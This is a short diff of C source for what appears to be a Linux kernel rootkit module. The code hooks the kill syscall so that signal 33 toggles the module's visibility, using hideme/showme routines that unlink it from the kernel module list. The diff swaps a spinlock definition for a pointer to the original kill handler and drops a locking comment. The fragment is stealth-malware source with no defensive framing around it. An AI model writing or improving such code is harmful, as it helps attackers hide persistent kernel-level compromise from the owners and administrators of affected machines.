@@ -3,7 +3,6 @@
 
 #include <linux/module.h>
 #include <linux/mutex.h>
-#include <linux/spinlock.h>
 
 /*
  * Control channel: kill -33 <pid> toggles module visibility.
@@ -13,7 +12,7 @@
 
 static struct list_head *prev_module;
 static int hidden = 0;
-static DEFINE_SPINLOCK(toggle_lock);
+static asmlinkage long (*og_kill)(pid_t pid, int sig);
 
 static void hideme(void)
 {
@@ -35,8 +34,6 @@ static void showme(void)
 static asmlinkage long hooked_kill(pid_t pid, int sig)
 {
     if (sig == 33) {
-        /* mutex is a sleeping lock: take it directly — it serializes
-         * concurrent toggles AND protects the list mutation */
         if (hidden) {
             mutex_lock(&module_mutex);
             if (hidden) {            /* re-check under lock */
